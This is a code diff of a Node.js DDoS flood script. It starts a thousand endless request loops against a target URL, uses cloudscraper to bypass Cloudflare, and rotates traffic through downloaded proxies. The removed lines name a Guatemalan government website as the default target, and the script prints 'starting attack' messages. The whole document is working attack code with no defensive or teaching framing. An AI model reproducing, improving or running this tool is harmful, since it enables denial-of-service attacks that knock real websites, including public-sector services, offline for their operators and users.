@@ -1,14 +1,13 @@
 'use strict';
 
-const pLimit = require('p-limit');
 const cloudscraper = require('cloudscraper');
 const args = require('minimist')(process.argv.slice(2));
 const fs = require('fs');
-
-const site = args['attack'] || "https://www.guatemala.gob.gt";
+const site = args['attack'];
 const threads = args['threads'] || 1000;
-const updateproxy = (args['updateproxy']=="true"||false);
-const checkproxy = (args['checkproxy']=="true" || false);
+const proxy = args['proxy'] == "true";
+const updateproxy = args['updateproxy'] == "true";
+const checkproxy = true;
 
 let globalProxies = [];
 let useProxy = false;
@@ -23,8 +22,6 @@ if (isNaN(threads)) {
   return;
 }
 
-
-
 function getRandomInt(max) {
   return Math.floor(Math.random() * Math.floor(max));
 }
@@ -38,7 +35,7 @@ function createThread() {
       if (useProxy) {
         let index = getRandomInt(globalProxies.length);
         options.proxy = globalProxies[index];
-        options.tunnel = false;
+        options.tunnel = true;
       }
       cloudscraper.get(options, function (error, response, body) {
         if (error) {
@@ -53,28 +50,6 @@ function createThread() {
   });
 }
 
-function createThreadTestProxy(site, proxy) {
-  return new Promise((resolve, reject) => {
-    try {
-      let options = { uri: site };
-
-      if (useProxy) {
-        options.proxy = proxy;
-        options.tunnel = false;
-      }proxy
-      cloudscraper.get(options, function (error, response, body) {
-        if (error) {
-          reject(false);
-        } else {
-          resolve(proxy);
-        }
-      });
-    } catch (e) {
-      reject(false)
-    }
-  });
-}
-
 async function infiniteThread() {
   while (true) {
     try {
@@ -82,9 +57,15 @@ async function infiniteThread() {
     } catch (e) {
     }
   }
+  // try {
+  //   await createThread();
+  // } catch (e) {
+  // }
+
+  infiniteThread();
 }
 
-async function testProxy() {
+async function loadProxies() {
   console.log("testing proxies...");
   const proxiesText = fs.readFileSync('proxy.txt', 'utf8');
   const proxies = proxiesText != null && proxiesText.length > 0 ? proxiesText.split('\n') : null;
@@ -92,58 +73,62 @@ async function testProxy() {
   if (proxies == null || proxies.length == 0)
     return [];
 
-  const limit = pLimit(100);
   let validProxies = [];
-  let promises = [];
   for (let index = 0; index < proxies.length; index++) {
     const proxy = 'http://' + proxies[index];
-
-    // try {
-    promises.push(limit(() => createThreadTestProxy(site, proxy)));
-    //   validProxies.push(proxy);
-    //   console.log("works");
-    // } catch (e) {
-    //   console.log("fails");
-    // }
+    validProxies.push(proxy);
   }
 
-  let bulk = await Promise.all(promises);
-  validProxies = bulk.filter(result => result);
   console.log(`${validProxies.length} valid proxies`);
   return validProxies;
 }
 
-async function start() {
-  if(updateproxy)
-  {
-	
-	var spawn = require("child_process").spawn;
-	var command="./HiberProxy.py";
-	var checkparameter="n";
-	if(checkproxy)
-	{
-		var checkparameter="y";
-	}
-	else
-	{
-		var checkparameter="n";
-	}
-	var process = spawn("python3", [command,"--checkproxy",checkparameter]);
-	console.log("Actualizando proxys ...espera");
-	process.stdout.on('data', function (data) {
-		console.log(data.toString());
-	});
-	process.stderr.on('data', (data) => {
-		console.log(data.toString());
-	});
+async function downloadProxy() {
+  if (!updateproxy)
+    return "";
+
+  var spawn = require("child_process").spawn;
+  var command = "./HiberProxy.py";
+  var checkparameter = "n";
+
+  if (checkproxy) {
+    var checkparameter = "y";
   }
-  const validProxies = await testProxy();
-  if (validProxies.length > 0) {
-    useProxy = true;
-    globalProxies = validProxies;
+  else {
+    var checkparameter = "n";
   }
 
-  console.log("starting attack");
+  return await new Promise((resolve, reject) => {
+    var process = spawn("python3", [command, "--checkproxy", checkparameter]);
+    console.log("Actualizando proxys... espera");
+
+    process.on('close', function (code) {
+      resolve(code);
+    });
+    process.stdout.on('data', function (data) {
+      console.log(data.toString());
+    });
+    process.stderr.on('data', (data) => {
+      console.error(data.toString());
+    });
+  });
+}
+
+async function start() {
+
+  try {
+    await downloadProxy();
+  } catch (e) { }
+
+  if (proxy) {
+    const validProxies = await loadProxies();
+    if (validProxies.length > 0) {
+      useProxy = true;
+      globalProxies = validProxies;
+    }
+  }
+
+  console.log("starting attack => " + site);
   for (let index = 0; index < threads; index++) {
     infiniteThread();
   }
